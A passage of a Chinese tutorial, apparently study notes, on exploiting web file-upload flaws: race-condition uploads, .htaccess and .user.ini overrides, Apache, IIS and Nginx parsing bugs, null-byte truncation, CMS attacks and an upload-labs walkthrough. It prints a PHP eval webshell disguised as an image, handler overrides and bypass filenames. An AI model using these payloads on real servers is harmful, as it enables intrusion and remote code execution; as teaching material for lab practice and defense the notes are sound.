<code>删除</code> 。</p><p>因此如果我们想要上传 <code>.php</code> 文件的话，就需要 在 其服务器删除我们的文件之前进行访问利用。</p><p>方法：短时间内不断重复上传该文件，可使用 BurpSuite</p><h4 id="方法一：Burp-Suite-爆破"><a href="#方法一：Burp-Suite-爆破" class="headerlink" title="方法一：Burp Suite 爆破"></a>方法一：Burp Suite 爆破</h4><p>上传一个key.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;info.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="meta">?&gt;</span> <span class="comment">//此代码的作用是只要 一访问到key.php，此脚本就被解析 进而生成info.php文件，内容为 <span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/KQX49bE83T5svuC.png" alt="image-20210414194605250"></p><p>进行无限次的 上传 key.php 和无限次的访问 key.php</p><p>直到访问的状态码为200即上传 info.php成功</p><h4 id="方法二：访问部分可使用-python脚本"><a href="#方法二：访问部分可使用-python脚本" class="headerlink" title="方法二：访问部分可使用 python脚本"></a>方法二：访问部分可使用 python脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8090/upload/key.php&quot;</span> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">    html = requests.get(url) </span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>: <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line">    <span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="三、-htaccess-攻击"><a href="#三、-htaccess-攻击" class="headerlink" title="三、.htaccess 攻击"></a>三、.htaccess 攻击</h1><blockquote><p><strong>httpd-conf</strong> 是APache <strong>系统的配置文件（全局的）</strong>；</p><p><strong>.htaccess</strong> 文件是 Apache <strong>服务器的分布式配置文件（局部的）</strong>，该配置文件会覆盖Apache服务器的全局配置，只对 <strong>该文件所在目录下的文件起作用</strong>。<br>如果一个Web应用程序允许上传.htaccess文件，则说明攻击者可以更改Apache的配置。</p></blockquote><ul><li><p><strong>缺点</strong>：只在 <code>Apache 服务器</code> 下起作用</p></li><li><p><strong>使用条件：</strong></p></li></ul><p>Apache目录下：/conf/httpd.conf 中 <code>AllowOverride</code> 为 <code>All</code> 则意味着.htaccess 文件可更改 Apache 配置<br><img src="https://i.loli.net/2021/06/06/xcDiO5rdkplgwCZ.png" alt="20210211121910536"></p><h2 id="3-1-利用一：将-png-文件当作-PHP文件处理"><a href="#3-1-利用一：将-png-文件当作-PHP文件处理" class="headerlink" title="3.1 利用一：将.png 文件当作 PHP文件处理"></a>3.1 利用一：将.png 文件当作 PHP文件处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将所有.png格式的图片都当作.php处理：phpinfo.png</span><br><span class="line">在 .htaccess 文件中写入：</span><br><span class="line">AddType application/x-httpd-php .png </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/CWcPAyVXHQOdsBq.png" alt="在这里插入图片描述"></p><p><img src="https://i.loli.net/2021/06/06/XrO9nAwRfjtH1lz.png" alt="在这里插入图片描述"></p><p><img src="https://i.loli.net/2021/06/06/QCVYdEzUcjI6bFf.png" alt="20210211124119106"></p><h2 id="3-2-利用二：文件中包含-php-关键字"><a href="#3-2-利用二：文件中包含-php-关键字" class="headerlink" title="3.2 利用二：文件中包含 php 关键字"></a>3.2 利用二：文件中包含 php 关键字</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件名中只要包含 .php 关键字就当作php处理：phpinfo.php.png</span><br><span class="line">在 .htaccess 文件中写入：</span><br><span class="line">AddHandler php5<span class="operator">-</span>script php </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/pXZrE6JPm8WGdYL.png" alt="20210211124119106"></p><p><img src="https://i.loli.net/2021/06/06/4Y59p7Ga2inoFr3.png" alt="20210211124848875"></p><p><img src="D:\images\20210211125111782.png" alt="20210211125111782"></p><h2 id="3-3-利用三：匹配文件名"><a href="#3-3-利用三：匹配文件名" class="headerlink" title="3.3 利用三：匹配文件名"></a>3.3 利用三：匹配文件名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">匹配文件名：文件名</span><br><span class="line"><span class="operator">&lt;</span>FilesMatch &quot;文件名&quot;<span class="operator">&gt;</span></span><br><span class="line">SetHandler application<span class="operator">/</span>x<span class="operator">-</span>httpd<span class="operator">-</span>php</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>FilesMatch<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/PTml1WOKonfN6AM.png" alt="在这里插入图片描述"></p><p><img src="https://i.loli.net/2021/06/06/LoMvPX1JVKiSQpG.png" alt="在这里插入图片描述"></p><p><img src="https://i.loli.net/2021/06/06/HtTUl9YxvQwIghs.png" alt="20210211125342878"></p><h2 id="3-4-利用四：将所有文件后缀都当作php文件处理"><a href="#3-4-利用四：将所有文件后缀都当作php文件处理" class="headerlink" title="3.4 利用四：将所有文件后缀都当作php文件处理"></a>3.4 利用四：将所有文件后缀都当作php文件处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.htaccess 文件当中写入：</span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">phpinfo1.gif</span><br><span class="line">    写入：&lt;?<span class="function">php <span class="title">phpinfo</span><span class="params">()</span></span>; ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/Fi2MDBhAvXSGP7n.png" alt="image-20210323161559814"></p><h1 id="四、-user-ini"><a href="#四、-user-ini" class="headerlink" title="四、.user.ini"></a>四、.user.ini</h1><blockquote><p><strong>php.ini</strong> 是 PHP 的一个 全局配置文件（全局的）；</p><p><strong>.user.ini</strong> 是 PHP的目录配置文件（局部的），相当于用户自己定义的一个 <strong>php.ini</strong> 文件。</p></blockquote><p>PHP中的每个配置都有其所处的模式。其中允许使用 <code>.user.ini</code> 能够更改的模式有 <code>PHP_INI_PERDIR 和 PHP_INI_USER </code>等等。</p><p>而 <code>PHP_INI_PERDIR</code> 这个模式当中的 <strong>auto_append_file 和 auto_prepend_file</strong> 这两个配置对我们有很大帮助。</p><blockquote><p>**auto_append_file ** ：指定一个文件在主文件解析之前解析；</p><p><strong>auto_prepend_file</strong>：指定一个文件在主文件之后解析。</p></blockquote><ul><li><p><strong>原理：</strong>我们可以使用 auto_prepend_file 这个选项，将我们所要上传的图片马在该目录下的其它PHP文件执行之前首先 <code>包含</code> 我们所上传的图片马。相当于在原有的 PHP文件的代码开头加上了 <code>require(&#39;a.jpg&#39;)</code> ，从而进行了 <code>文件包含</code>，这样我们的图片马就得到了利用。</p></li><li><p><strong>优点</strong>：不仅仅限于 Apache 服务器，还可以用于 Nginx , IIS 等服务器。</p></li><li><p><strong>使用条件</strong>：</p><ul><li>上传的 .user.ini 目录下必须含有 .php 文件，而一般的题目当中不会含有。</li><li>服务器使用CGI／FastCGI模式</li></ul></li><li><p><strong>利用</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.user.ini 文件：</span><br><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=a.jpg </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.jpg :</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @eval($_POST[<span class="string">&#x27;pass&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h1 id="五、Web容器解析漏洞"><a href="#五、Web容器解析漏洞" class="headerlink" title="五、Web容器解析漏洞"></a>五、Web容器解析漏洞</h1><h2 id="5-1-Apache-解析漏洞"><a href="#5-1-Apache-解析漏洞" class="headerlink" title="5.1 Apache 解析漏洞"></a>5.1 Apache 解析漏洞</h2><h3 id="5-1-1-多后缀文件解析漏洞"><a href="#5-1-1-多后缀文件解析漏洞" class="headerlink" title="5.1.1 多后缀文件解析漏洞"></a>5.1.1 多后缀文件解析漏洞</h3><p>Apache当中，多后缀文件将会从最右边的后缀开始识别，如果后缀不在对应的 MIME type 或者是 Hander，就会继续向左识别，直到后缀有对应的MIME type 或 Hander。</p><p><strong>利用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php.xxx.xx.x</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/JITQ1S2AxD7jtnC.png" alt="image-20210327131529195"></p><p><strong>注：该漏洞比较古老，大部分已经修复过了，但是会出现在CTF中</strong></p><h3 id="5-1-2-CVE-2017-15715-漏洞"><a href="#5-1-2-CVE-2017-15715-漏洞" class="headerlink" title="5.1.2 CVE-2017-15715 漏洞"></a>5.1.2 CVE-2017-15715 漏洞</h3><p>适用版本：2.4.0-2.4.29版本</p><p><strong>利用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php\n</span><br></pre></td></tr></table></figure><p>###xxx.asp;1.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将上传的 time.asp文件 抓包</span><br><span class="line">    修改后缀成为：time.asp;<span class="number">1</span>.jpg  <span class="comment">//像这样的文件名可以通过白名单，但是却可以被解析为 .asp文件</span></span><br><span class="line"><span class="comment"># 内容：&lt;%=time()%&gt; 作为试验</span></span><br></pre></td></tr></table></figure><h3 id="5-1-3-x-asp-time-jpg"><a href="#5-1-3-x-asp-time-jpg" class="headerlink" title="5.1.3 x.asp/time.jpg"></a>5.1.3 x.asp/time.jpg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先创建一个文件夹：例如：<span class="number">1.</span>asp</span><br><span class="line">上传.asp文件：time.jpg  <span class="comment">//内容：&lt;% =time()%&gt; &lt;% =now()%&gt;</span></span><br><span class="line">访问：<span class="number">1.</span>asp/time.jpg  <span class="comment">//将会被当作.asp文件进行解析 </span></span><br></pre></td></tr></table></figure><h2 id="5-3-PHP-CGI-解析漏洞"><a href="#5-3-PHP-CGI-解析漏洞" class="headerlink" title="5.3 PHP CGI 解析漏洞"></a>5.3 PHP CGI 解析漏洞</h2><p>条件：IIS 7.0 / 7.5</p><p>1.搭建 IIS 服务器           win-2008</p><p><img src="https://i.loli.net/2021/06/06/b5tGMwF9gikBqX8.png" alt="image-20210328163229440"></p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210328163331220.png" alt="image-20210328163331220"></p><p>下一步，点击安装</p><p><img src="https://i.loli.net/2021/06/06/zBfx3AQkP6esMD9.png" alt="image-20210328164022953"></p><p><img src="https://i.loli.net/2021/06/06/h7EyzfdLjrIct2m.png" alt="image-20210328163829923"></p><p><img src="https://i.loli.net/2021/06/06/JvkRuY3782MtPoc.png" alt="image-20210328164127331"></p><p>2.使 IIS 支持 PHP脚本类型</p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210328165154004.png" alt="image-20210328165154004"></p><p><img src="https://i.loli.net/2021/06/06/phjEqNax3fRtVru.png" alt="image-20210328165448862"></p><p>……未完成</p><p>最终的效果是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.png  该图片的内容是 &lt;?<span class="function">php <span class="title">phpinfo</span><span class="params">()</span></span>; ?&gt;</span><br><span class="line">    但是无法直接访问</span><br><span class="line">    而如果 访问</span><br><span class="line">    phpinfo.png/.php  就可以被解析</span><br></pre></td></tr></table></figure><p>防御避免只需要：</p><p><img src="https://i.loli.net/2021/06/06/QHtjxzlYNgdpio6.png" alt="image-20210328170651358"></p><blockquote><p>本质上是与 php.ini 中的 <code>cgi.fix_pathinfo</code> 配置选项有关，等于1即有漏洞，等于0则无。</p></blockquote><h1 id="六、Nginx-解析漏洞"><a href="#六、Nginx-解析漏洞" class="headerlink" title="六、Nginx 解析漏洞"></a>六、Nginx 解析漏洞</h1><h2 id="6-1-Nginx-解析漏洞"><a href="#6-1-Nginx-解析漏洞" class="headerlink" title="6.1 Nginx 解析漏洞"></a>6.1 Nginx 解析漏洞</h2><blockquote><p>原理与PHP CGI 解析漏洞相同–与 php.ini 中的 <code>cgi.fix_pathinfo</code> 配置选项有关，等于1即有漏洞，等于0则无。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php/.php</span><br></pre></td></tr></table></figure><h2 id="6-2-Nginx-空字节漏洞-零零截断"><a href="#6-2-Nginx-空字节漏洞-零零截断" class="headerlink" title="6.2 Nginx 空字节漏洞(零零截断)"></a>6.2 Nginx 空字节漏洞(零零截断)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.html%<span class="number">00.</span>php</span><br><span class="line">.php 后缀 使 Nginx 将 phpinfo.html文件 当作 php文件处理</span><br></pre></td></tr></table></figure><h2 id="6-3-Nginx-文件名逻辑漏洞-零零截断"><a href="#6-3-Nginx-文件名逻辑漏洞-零零截断" class="headerlink" title="6.3 Nginx 文件名逻辑漏洞(零零截断)"></a>6.3 Nginx 文件名逻辑漏洞(零零截断)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传 phpinfo.png空格</span><br><span class="line">访问 phpinfo.png ..php 其中将第一个 . 的十六进制更改为 <span class="number">00</span></span><br></pre></td></tr></table></figure><h2 id="6-4-文件名逻辑漏洞-CVE-2013-4547"><a href="#6-4-文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="6.4 文件名逻辑漏洞 (CVE-2013-4547)"></a>6.4 文件名逻辑漏洞 <strong>(CVE-2013-4547)</strong></h2><p>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常上传一个附加代码的图片&quot;test.jpg&quot;，访问时后面+&quot;空格&quot;+&quot;\0&quot;+&quot;.php&quot;，即让图片作为php文件解析</span><br></pre></td></tr></table></figure><h1 id="七、编辑器上传"><a href="#七、编辑器上传" class="headerlink" title="七、编辑器上传"></a>七、编辑器上传</h1><p>网站的后台编辑网页的在线编辑器，一般都会自动集成文件上传的功能，有些含有文件上传漏洞。</p><ul><li><p><strong>evebeditor</strong></p><p>进入后台可修改 <strong>相关配置</strong> ，比如上传文件的 <strong>白名单</strong>，我们可以添加上我们想上传的脚本类型；或者是在配置当中写入一句话木马，例如将该网页的一些标题更改为我们的一句话木马，等待别人上钩。</p></li><li><p><strong>fckeditor</strong></p><p>后台资源管理器，直接进行上传</p><p>技巧：抓包查看时，可以看到其Web服务器，可以利用相关的Web服务器的解析漏洞进行上传，例如：IIS解析漏洞；</p><p>如果所访问的服务器进行了防御，当我们成功上传大马之后，当我们进行访问时，它会自动跳转到别的地方，达不到我们想要的效果。</p><p>思路：首先上传一个小马，拿到webshell之后，在别的路径之下再上传我们的大马</p></li></ul><h1 id="八、零零截断"><a href="#八、零零截断" class="headerlink" title="八、零零截断"></a>八、零零截断</h1><h2 id="8-1-0x00截断原理"><a href="#8-1-0x00截断原理" class="headerlink" title="8.1 0x00截断原理"></a>8.1 0x00截断原理</h2><p>系统在对文件名的读取时，如果遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示0x00，就会认为读取已结束，也就是所说的0x00截断。</p><h2 id="8-2-URL中的-00"><a href="#8-2-URL中的-00" class="headerlink" title="8.2 URL中的 %00"></a>8.2 URL中的 %00</h2><p>系统是按16进制读取文件，URL中的 <code>%00</code> 是被服务器解码为 <code>0x00</code> 而发挥了截断作用。</p><h2 id="8-3-截断利用"><a href="#8-3-截断利用" class="headerlink" title="8.3 截断利用"></a>8.3 截断利用</h2><p><strong>利用条件：php版本小于 5.3.4 且 魔术引号关闭</strong></p><p>URL中的 <code>%00</code> 会自动被解码为 <code>0x00</code> ，所以需要时直接输入上 <code>%00</code> ，即可发挥截断作用；<br>以其它方式提交并且需要截断时，需要将其解码为十六进制的相应位置手动更改为 <code>00</code> ，才能发挥截断作用。</p><h3 id="GET-方式提交–会自动将-00-解析为-0x00-，发挥截断作用"><a href="#GET-方式提交–会自动将-00-解析为-0x00-，发挥截断作用" class="headerlink" title="GET 方式提交–会自动将 %00 解析为 0x00 ，发挥截断作用"></a>GET 方式提交–会自动将 %00 解析为 0x00 ，发挥截断作用</h3><p><img src="https://i.loli.net/2021/06/06/JTYPFbagqDoEnOQ.png" alt="image-20210323164754637"></p><h3 id="POST-方式提交–需要手动将其解码为-十六进制的-00-，发挥截断作用"><a href="#POST-方式提交–需要手动将其解码为-十六进制的-00-，发挥截断作用" class="headerlink" title="POST 方式提交–需要手动将其解码为 十六进制的 00 ，发挥截断作用"></a>POST 方式提交–需要手动将其解码为 十六进制的 00 ，发挥截断作用</h3><p><img src="https://i.loli.net/2021/06/06/ms4VyajKDup3Xxc.png" alt="image-20210323165351925"></p><h1 id="九、实战"><a href="#九、实战" class="headerlink" title="九、实战"></a>九、实战</h1><h2 id="9-1-由变量覆盖引起的文件上传漏洞"><a href="#9-1-由变量覆盖引起的文件上传漏洞" class="headerlink" title="9.1 由变量覆盖引起的文件上传漏洞"></a>9.1 由变量覆盖引起的文件上传漏洞</h2><p>metinfov5.0.4</p><p>修改变量的值–意味着可修改配置–可覆盖数据库用户名，密码，等待内容，使其连接到自己的服务器上</p><p>foreach遍历数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$name</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="comment">//传参  ?name=bbb</span></span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">      <span class="variable">$$key</span> = <span class="variable">$val</span>;   <span class="comment">//将变成 $name = bbb</span></span><br><span class="line">  &#125;</span><br><span class="line">  var_dump(<span class="variable">$name</span>);  <span class="comment">//这样相当于将上面的$name的值通过我们的GET传参进行了修改</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-2-常见-CMS-文件上传漏洞"><a href="#9-2-常见-CMS-文件上传漏洞" class="headerlink" title="9.2 常见 CMS 文件上传漏洞"></a>9.2 常见 CMS 文件上传漏洞</h2><p>CMS – 内容管理系统，常被用于 通过使用其上的网站模板二进行二次开发，从而 快速建站</p><p>dedeCMS   PHPcms</p><p>南方数据管理系统   .asp  access  .mdb文件</p><ul><li>SQL注入 查询 管理员密码</li><li>御剑扫描 后台 进行登录</li><li>文件上传 大马，绕过限制，获取路径</li><li>通过所上传的图片木马路径进行 数据库备份 将后缀备份成为 .asp</li></ul><p>防御：</p><ul><li><p>站库分离</p></li><li><p>不给 Databackup 执行权限</p></li><li><p>对 数据库备份功能 的过滤：数据库名称不可更改（后缀强制为.mdb）</p><p>所备份的名称 不允许更改后缀</p></li></ul><h2 id="9-3-upload-labs-–-Pass-21"><a href="#9-3-upload-labs-–-Pass-21" class="headerlink" title="9.3 upload-labs  –  Pass-21"></a>9.3 upload-labs  –  Pass-21</h2><h4 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组</span><br><span class="line">示例：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;www.runoob.com&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; www</span><br><span class="line">    [<span class="number">1</span>] =&gt; runoob</span><br><span class="line">    [<span class="number">2</span>] =&gt; com</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count() 函数返回数组中元素的数目</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">分析：</span><br><span class="line"><span class="number">1</span>.首先判断 MIME 类型，必须为 <span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line"><span class="number">2</span>.判断 <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]是否为空，不为空的话，就将 <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>] 赋值给 <span class="variable">$file</span></span><br><span class="line"><span class="number">3</span>.判断 <span class="variable">$file</span> 是否为数组，不是的话，使用 . 将其分割为数组元素</span><br><span class="line"><span class="number">4</span>.判断文件后缀名：取 <span class="variable">$file</span> 数组的最后一个元素 作为 <span class="variable">$ext</span> 的值，判断是否符合白名单</span><br><span class="line"><span class="number">5</span>.符合的话，使用 reset(<span class="variable">$file</span>)函数取 数组 <span class="variable">$file</span>的第一个元素，拼接一个<span class="string">&quot;.&quot;</span>，然后再拼接上 该数组含有元素个数-<span class="number">1</span> 的元素 作为文件名</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210323184828923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">绕过分析：</span><br><span class="line"><span class="number">1</span>.抓包更改 MIME类型--image/jpeg</span><br><span class="line"><span class="number">2</span>.将用户所输入的 <span class="string">&quot;save_name&quot;</span> 更改为一个数组，并赋值：<span class="variable">$save_name</span>[<span class="number">0</span>] = <span class="number">2121</span>.php/；<span class="variable">$save_name</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;<span class="variable">$save_name</span>[<span class="number">2</span>] = jpg</span><br><span class="line"><span class="number">3</span>.则 <span class="variable">$file</span> 本身就成为了一个数组，不会被 . 分割；</span><br><span class="line">reset(<span class="variable">$file</span>) 将会是 <span class="variable">$file</span> 的第一个元素，即 <span class="number">2121</span>.php/；</span><br><span class="line">由于 <span class="variable">$file</span>[<span class="number">1</span>] = <span class="literal">NULL</span>（不可以这么说，因为<span class="literal">NULL</span>不等于空，如果像这样设置<span class="variable">$file</span>[<span class="number">1</span>] = <span class="literal">NULL</span>，count()所计算的个数当中是包含该元素的，这里只是为了便于理解），则count(<span class="variable">$file</span>) 